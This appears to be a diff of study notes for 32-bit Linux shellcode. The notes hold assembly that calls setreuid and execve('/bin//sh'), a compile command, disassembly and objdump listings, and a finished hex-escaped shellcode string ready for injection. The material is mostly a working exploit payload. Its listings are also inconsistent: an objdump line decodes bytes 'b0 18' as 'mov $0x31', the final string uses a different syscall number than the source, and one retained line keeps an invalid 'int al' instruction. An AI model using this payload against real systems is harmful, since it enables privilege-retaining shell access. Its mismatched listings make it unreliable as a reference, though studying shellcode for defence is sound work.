@@ -1,18 +1,16 @@
-
-
 .intel_syntax noprefix
 .global main
 main:
     //getuid
     xor eax, eax
-    int al, 0x18
+    mov al, 0x18
     int 0x80
 
     //setreuid
     mov ebx, eax
     mov ecx, eax
     xor eax, eax
-    int al, 0x46
+    mov al, 0x46
     int 0x80
 
     //arg3 : edx
@@ -35,7 +33,10 @@ main:
     int 0x80
 
     
+#compile
+$gcc shell.s -o shell
 
+#disassem execve
 0x804d062 <__execve+22>:	mov    0xc(%ebp),%ecx
 0x804d065 <__execve+25>:	mov    0x10(%ebp),%edx
 0x804d068 <__execve+28>:	push   %ebx
@@ -67,4 +68,34 @@ mov ecx, eax
 xor eax, eax
 int al, 0x46
 int 0x80
+
+
+#objdump
+$objdump -x ./shell
+ 8048398:	31 c0                	xor    %eax,%eax
+ 804839a:	b0 18                	mov    $0x31,%al
+ 804839c:	cd 80                	int    $0x80
+ 804839e:	89 c3                	mov    %eax,%ebx
+ 80483a0:	89 c1                	mov    %eax,%ecx
+ 80483a2:	31 c0                	xor    %eax,%eax
+ 80483a4:	b0 46                	mov    $0x46,%al
+ 80483a6:	cd 80                	int    $0x80
+ 80483a8:	31 d2                	xor    %edx,%edx
+ 80483aa:	52                   	push   %edx
+ 80483ab:	68 2f 2f 73 68       	push   $0x68732f2f
+ 80483b0:	68 2f 62 69 6e       	push   $0x6e69622f
+ 80483b5:	89 e3                	mov    %esp,%ebx
+ 80483b7:	52                   	push   %edx
+ 80483b8:	53                   	push   %ebx
+ 80483b9:	89 e1                	mov    %esp,%ecx
+ 80483bb:	31 c0                	xor    %eax,%eax
+ 80483bd:	b0 0b                	mov    $0xb,%al
+ 80483bf:	cd 80                	int    $0x80
+
+
+########################
+\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80
+########################
+
+
 
